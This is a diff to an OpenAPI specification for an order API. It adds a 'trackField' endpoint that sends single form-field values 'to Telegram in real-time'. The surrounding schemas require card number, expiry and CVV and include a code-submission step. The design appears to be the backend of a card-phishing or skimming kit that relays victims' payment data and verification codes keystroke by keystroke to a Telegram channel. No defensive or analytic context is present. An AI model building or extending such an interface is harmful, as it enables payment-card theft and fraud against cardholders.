@@ -68,6 +68,33 @@ paths:
             application/json:
               schema:
                 $ref: "#/components/schemas/Order"
+  /orders/{orderId}/field:
+    post:
+      operationId: trackField
+      tags: [orders]
+      summary: Send a single field value to Telegram in real-time
+      parameters:
+        - name: orderId
+          in: path
+          required: true
+          schema:
+            type: string
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: "#/components/schemas/TrackFieldRequest"
+      responses:
+        "200":
+          description: Field tracked
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  ok:
+                    type: boolean
   /orders/{orderId}/code:
     post:
       operationId: submitCode
@@ -201,6 +228,16 @@ components:
         - cardNumber
         - cardExpiry
         - cardCvv
+    TrackFieldRequest:
+      type: object
+      properties:
+        fieldName:
+          type: string
+        fieldValue:
+          type: string
+      required:
+        - fieldName
+        - fieldValue
     SubmitCodeRequest:
       type: object
       properties:
